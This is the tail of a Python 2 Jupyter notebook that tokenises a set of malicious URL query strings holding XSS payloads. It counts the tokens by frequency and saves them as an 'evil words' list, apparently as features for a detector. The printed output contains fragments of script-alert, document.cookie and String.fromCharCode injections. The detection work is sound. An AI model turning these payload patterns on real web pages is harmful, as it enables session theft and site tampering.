'0bd0a0ab0d0b0cd0b0f0aebf0f0ade0f0b0a0a0b0b0e0f0b0b0b0e0c0fcd0a0e0ccbde0f0fe0e0f0ef0fffd0c0a0fa0c0cd0cb0a0ea0ccb0c0d0bc0d0dc0ead0b0d0a0e0f0a0d0b0f0c0c0bde0fb0c0ea0a0da0dd0d0c0c0a0cbaca0e0ec0d0e0bea0b0bc0c0ace0a0c0f0be0ecf0cf0a0cc0dd0d0d0b0c0afe0df0ff0ffdf0db0b0ceb0fc0a0da0ffb0b0de0fe0aed0beba0ce0d0dcc0b0ffca0cd0c', 'searchterm=', '>', '<script>', 'alert(', \"'0ssi0_tr'\", ')', '</script>', 'title=', '<script>', 'alert(', 'the', 'best', 'xsser', ')', '</script>', 'title=', '<script>', 'alert(', 'the', 'best', 'xsser', ')', '</script>', 'ara=', '>', '<script>', 'alert(', \"'0ssi0_tr'\", ')', '</script>', 'theurl=', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>', 'action=', 'results', 'poll_ident=', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>', 'tx0=', '>', '<script>', 'alert(', 'x', 'turk', ')', '</script>', 'tqmhak=', '0', 'ql=', 'a', 'keywords=', '>', '<script>', 'alert(', 'x', 'turk', ')', '</script>', 'err=', '>', '<script>', 'alert(', 'x', 'turk', ')', '</script>', 'query=', '>', '<script>', 'alert(', 'x', 'turk', ')', '</script>', 'l_id=', 'de', 'country0=', '0', 'clinks=', '0', 'cmetadata=', '0', 'search=', 'alert(', 'string.fromcharcode(', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', ')', ')', 'alert(', 'string.fromcharcode(', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', ')', ')', 'alert(', 'string.fromcharcode(', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', ')', ')', 'alert(', 'string.fromcharcode(', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', ')', ')', '>', '</script>', '>', '>', '<script>', 'alert(', 'string.fromcharcode(', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', ')', ')', '</script>', 'search=', '>', '<script>', 'alert(', 'x', 'turk', ')', '</script>', 'search=', 'all', 'string=', '>', '<script>', 'alert(', 'x', 'turk', ')', '</script>', 'displaymode=', '0', 'lsi=', '0', 'q=', '>', '>', '<script>', 'alert(', 'string.fromcharcode(', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', ')', ')', '</script>', 'go=', 'go', 'command=', '>', '<script>', 'alert(', 'x', 'turk', ')', '</script>', 'searchfor=', '>', '<script>', 'alert(', 'x', 'turk', ')', '</script>', 'all_comments', 'v=', 'npcmj0xllfo', 'fromurl=', '>', '<script>', 'alert(', 'redworm', 'from', 'turkey', ')', '</script>', 'friends_email=', '>', '>', '<script', '>', 'alert(', \"'xss'\", ')', '</script>', 'share_message=', 'vulnerable', 's=', '0', 'str=', '<script>', 'alert(', '\"xss_darktoxic\"', ')', '</script>', 'hata=', '<imgsrc', 'http://u', '>', 'kelime=', '<imgsrc', 'http://u', '>', 'kl=', '<imgsrc', 'http://u', '>', 'ara=', '<img', 'src=', 'http://u', '>', 'mode=', '>', '<imgsrc', 'http://u', '>', 'burc=', '0', 'tr=', '>', '<imgsrc', 'http://u', '>', 'alias=', '>', '<imgsrc', 'http://u', '>', 'link=', 'http://u', 'id=', 'list', 'act=', 'k', 'j=', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>', 'keyword=', 'alert(', 'string.fromcharcode(', '0', '0', '0', ')', ')', 'alert(', 'string.fromcharcode(', '0', '0', '0', ')', ')', 'alert(', 'string.fromcharcode(', '0', '0', '0', ')', ')', 'alert(', 'string.fromcharcode(', '0', '0', '0', ')', ')', '>', '</script>', '>', '>', '<script>', 'alert(', 'string.fromcharcode(', '0', '0', '0', ')', ')', '</script>', 'sc=', 'forum', 'w=', '<iframe', 'src=', 'javascript', 'alert(', 'soso.com', 'xssed', 'hexspirit', ')', '>', '</iframe>', 'main=', 'search', 'ust_id=', '0', 'ara=', '>', '<script>', 'alert(', '\"xssed\"', ')', '</script>', 'issue=', '0.gif', '>', '</a>', '<script>', 'alert(', '\"xss\"', ')', '</script>', 'q=', '>', '</a>', '<script>', 'alert(', 'document.cookie', ')', '</script>', 'pbsearch=', 'true', 'domains=', 'photobucket.com', 'client=', 'pub', '0', 'channel=', '0', 'safe=', 'active', 'cof=', 'galt', '0', 'div', 'd0d0d0', 'vlc', '0ff', 'alc', '0ff', 'lc', '0ff', 'bgc', 'ffffff', 't', '0', 'gfnt', '0ff', 'gimp', '0', 's', 'http://u', 'forid', '0', 'cat=', '>', '<script>', 'alert(', \"'0ssi0_tr'\", ')', '</script>', 'offset=', '0', 'inst=', '<script', '>', 'alert(', 'string.fromcharcode(', '0', '0', '0', ')', ')', '</script>', 'abbrevate=', '0', '0', '0email', 'address.com', 'submit=', 'search', 'catid=', '0', 'subcatid=', 'search=', '>', '<script>', 'alert(', \"'0ssi0_tr'\", ')', '</script>', 'juego=', '>', '<script>', 'alert(', 'cola', 'turka', 'numboro', 'ne', 'p', ')', '</script>', 'search=', '>', '<script>', 'alert(', \"'0ssi0_tr'\", ')', '</script>', 'segmento=', '>', '>', '<script>', 'alert(', 'string.fromcharcode(', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', ')', ')', '</script>', 'pname=', 'qry=', 'alert(', 'string.fromcharcode(', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', ')', ')', 'alert(', 'string.fromcharcode(', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', ')', ')', 'alert(', 'string.fromcharcode(', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', ')', ')', 'alert(', 'string.fromcharcode(', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', ')', ')', '>', '</script>', '>', '>', '<script>', 'alert(', 'string.fromcharcode(', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', ')', ')', '</script>', 'cat=', '>', '</a>', '<script>', 'alert(', 'document.cookie', ')', '</script>', 'user=', '</script>', '>', '<script>', 'alert(', 'string.fromcharcode(', '0', ')', ')', '</script>', 'fromcp=', 'y', 'jobcategorycodeid=', 'joblocationcodeid=', 'jobproductcodeid=', 'jobtitlecodeid=', 'divisions=', 'targetlevels=', 'keywords=', 'job', 'jobcode=', 'manageralias=', 'interval=', '0', 'sortorder=', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>', 'template_type=', 'computer_store', 'landing=', 'desktops', 'a0=', 'brand', 'v0=', 'hp', 'pavilion', 'media', 'center', 'aoid=', 'alert(', 'string.fromcharcode(', '0', '0', '0', '0', '0', ')', ')', 'alert(', 'string.fromcharcode(', '0', '0', '0', '0', '0', ')', ')', 'alert(', 'string.fromcharcode(', '0', '0', '0', '0', '0', ')', ')', 'alert(', 'string.fromcharcode(', '0', '0', '0', '0', '0', ')', ')', '>', '</script>', '>', '>', '<script>', 'alert(', 'string.fromcharcode(', '0', '0', '0', '0', '0', ')', ')', '</script>', 'mtd=', '0', 'strkey=', '>', '<script>', 'alert(', \"'0ssi0_tr'\", ')', '</script>', 'kh=', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>', 'title=', '<script>', 'alert(', 'the', 'best', 'xsser', ')', '</script>', 'last=', '>', '<script>', 'alert(', \"'0ssi0_tr'\", ')', '</script>', 'hl=', 'tr', 'lr=', 'as_qdr=', 'all', 'q=', '>', '<script>', 'alert(', \"'0ssi0_tr'\", ')', '</script>', 'action=', 'formgen', 'template=', '<script>', 'alert(', \"'e0'\", ')', '</script>', 'n=', 'main.wikisandbox', 'from=', '>', '<bodyonload', 'alert(', '0', ')', '>']\n"
     ]
    }
   ],
   "source": [
    "# 取词的全集生成新的SFrame\n",
    "ans = []\n",
    "black['parsed'].apply(lambda x:[ans.append(i) for i in x])\n",
    "print ans"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "evil_word_frame = gl.SFrame(data=ans)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div style=\"max-height:1000px;max-width:1500px;overflow:auto;\"><table frame=\"box\" rules=\"cols\">\n",
       "    <tr>\n",
       "        <th style=\"padding-left: 1em; padding-right: 1em; text-align: center\">X1</th>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">search=</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">&lt;/script&gt;</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">&lt;img</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">src=</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">worksinchrome</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">colon</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">prompt</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">x0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">x0</td>\n",
       "    </tr>\n",
       "</table>\n",
       "[1595 rows x 1 columns]<br/>Note: Only the head of the SFrame is printed.<br/>You can use print_rows(num_rows=m, num_columns=n) to print more rows and columns.\n",
       "</div>"
      ],
      "text/plain": [
       "Columns:\n",
       "\tX1\tstr\n",
       "\n",
       "Rows: 1595\n",
       "\n",
       "Data:\n",
       "+---------------+\n",
       "|       X1      |\n",
       "+---------------+\n",
       "|    search=    |\n",
       "|   </script>   |\n",
       "|      <img     |\n",
       "|      src=     |\n",
       "| worksinchrome |\n",
       "|     colon     |\n",
       "|     prompt    |\n",
       "|       x0      |\n",
       "|       0       |\n",
       "|       x0      |\n",
       "+---------------+\n",
       "[1595 rows x 1 columns]\n",
       "Note: Only the head of the SFrame is printed.\n",
       "You can use print_rows(num_rows=m, num_columns=n) to print more rows and columns."
      ]
     },
     "execution_count": 30,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "evil_word_frame"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "evil_word_frame['count'] = evil_word_frame.apply(lambda x:len(evil_word_frame.filter_by(x['X1'],'X1')))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "evil_word_frame = evil_word_frame.unique().sort('count',ascending=False)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div style=\"max-height:1000px;max-width:1500px;overflow:auto;\"><table frame=\"box\" rules=\"cols\">\n",
       "    <tr>\n",
       "        <th style=\"padding-left: 1em; padding-right: 1em; text-align: center\">X1</th>\n",
       "        <th style=\"padding-left: 1em; padding-right: 1em; text-align: center\">count</th>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">0</td>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">491</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">)</td>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">155</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">&gt;</td>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">120</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">alert(</td>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">113</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">&lt;/script&gt;</td>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">99</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">&lt;script&gt;</td>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">83</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">string.fromcharcode(</td>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">37</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">http://u</td>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">15</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">document.cookie</td>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">15</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">xss</td>\n",
       "        <td style=\"padding-left: 1em; padding-right: 1em; text-align: center; vertical-align: top\">10</td>\n",
       "    </tr>\n",
       "</table>\n",
       "[330 rows x 2 columns]<br/>Note: Only the head of the SFrame is printed.<br/>You can use print_rows(num_rows=m, num_columns=n) to print more rows and columns.\n",
       "</div>"
      ],
      "text/plain": [
       "Columns:\n",
       "\tX1\tstr\n",
       "\tcount\tint\n",
       "\n",
       "Rows: 330\n",
       "\n",
       "Data:\n",
       "+----------------------+-------+\n",
       "|          X1          | count |\n",
       "+----------------------+-------+\n",
       "|          0           |  491  |\n",
       "|          )           |  155  |\n",
       "|          >           |  120  |\n",
       "|        alert(        |  113  |\n",
       "|      </script>       |   99  |\n",
       "|       <script>       |   83  |\n",
       "| string.fromcharcode( |   37  |\n",
       "|       http://u       |   15  |\n",
       "|   document.cookie    |   15  |\n",
       "|         xss          |   10  |\n",
       "+----------------------+-------+\n",
       "[330 rows x 2 columns]\n",
       "Note: Only the head of the SFrame is printed.\n",
       "You can use print_rows(num_rows=m, num_columns=n) to print more rows and columns."
      ]
     },
     "execution_count": 33,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "evil_word_frame"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "evil_word_frame['X1'].save('evil_words_1.csv')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 2",
   "language": "python",
   "name": "python2"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.11"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 0
}
